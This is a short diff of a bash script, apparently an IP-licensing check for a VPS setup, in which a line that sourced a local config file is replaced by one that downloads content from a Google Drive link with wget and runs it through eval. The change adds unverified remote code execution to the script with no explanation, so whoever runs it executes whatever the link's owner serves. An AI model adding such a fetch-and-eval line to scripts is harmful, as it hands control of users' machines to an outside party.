@@ -1,6 +1,6 @@
 #!/bin/bash
 MYIP=$(cat /usr/bin/.ipvps)
-source /usr/bin/var.conf
+eval $(wget -qO- "https://drive.google.com/u/4/uc?id=1eutPTYsea7xYx1mNBWDQ_g1Yx3ZPNimF")
     ALLOWED_IP=$(curl -sS "$IZIN" | grep -wE "$MYIP" | awk '{print $4}')
     if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
 	echo -n
